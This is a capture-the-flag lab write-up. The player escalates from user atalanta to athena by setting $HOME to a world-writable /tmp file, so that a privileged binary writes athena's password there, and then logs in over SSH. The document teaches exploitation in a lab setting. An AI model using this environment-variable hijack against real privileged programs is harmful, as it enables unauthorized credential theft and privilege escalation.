# 0x14

moving from `atalanta` to `athena`

---

The mission for this stage involved analyzing a privileged binary and its source code:

```bash
atalanta@hades:~$ cat mission.txt 
################
# MISSION 0x14 #
################

## EN ##
User athena lets us run her program, but she hasn't left us her source code.
```

In the home directory, I found an executable named `weird` and its corresponding source file `weird.c`.

### The Solution: Environment Variable Hijacking (Arbitrary File Write)

Upon inspecting `weird.c`, I identified a critical vulnerability in how the program handles the `HOME` environment variable.

#### 1. Code Analysis

The program performs the following actions:

* It sets its execution context to user `2006` (athena).
* It reads the contents of the restricted file `/var/lib/me` (which contains the password).
* It uses `getenv("HOME")` to determine where to write the output.
* It opens the path specified in `$HOME` and writes the secret data into it.

```c
filename = getenv("HOME");
...
FILE *out_file = fopen(getenv("HOME"), "w");
...
char *command = "/bin/cat /var/lib/me";
```

#### 2. Exploiting the Path Logic

Because the program blindly trusts the user-defined `$HOME` variable as a writable file path, I could redirect the output to a location I controlled.

#### 3. Execution and Extraction

I created a temporary file with full permissions and updated my environment to point the binary toward it.

```bash
atalanta@hades:~$ touch /tmp/athena_secret
atalanta@hades:~$ chmod 777 /tmp/athena_secret 
atalanta@hades:~$ HOME=/tmp/athena_secret
atalanta@hades:/pwned/atalanta$ echo $HOME
/tmp/athena_secret
atalanta@hades:/pwned/atalanta$ ./weird
HOME detected: /tmp/athena_secret
```

After running the binary, the password for `athena` was written into the `/tmp` file.

```bash
atalanta@hades:/pwned/atalanta$ cat /tmp/athena_secret
[REDACTED]
```

### Explanation

* **SUID/SGID**: The `weird` binary was configured to run with elevated privileges, allowing it to read the protected `/var/lib/me` file that `atalanta` normally cannot access.
* **Arbitrary File Write**: By manipulating the environment variables that a program depends on, an attacker can trick the software into performing operations (like writing secrets) in unintended locations.
* **The Finding**: The contents of `/var/lib/me` served as the login credential for user **athena**.

### Execution

Using the retrieved password, I successfully established a clean session as `athena`.

```bash
atalanta@hades:/pwned/atalanta$ ssh athena@localhost
...
athena@hades:~$ id
uid=2006(athena) gid=2006(athena) groups=2006(athena)
```
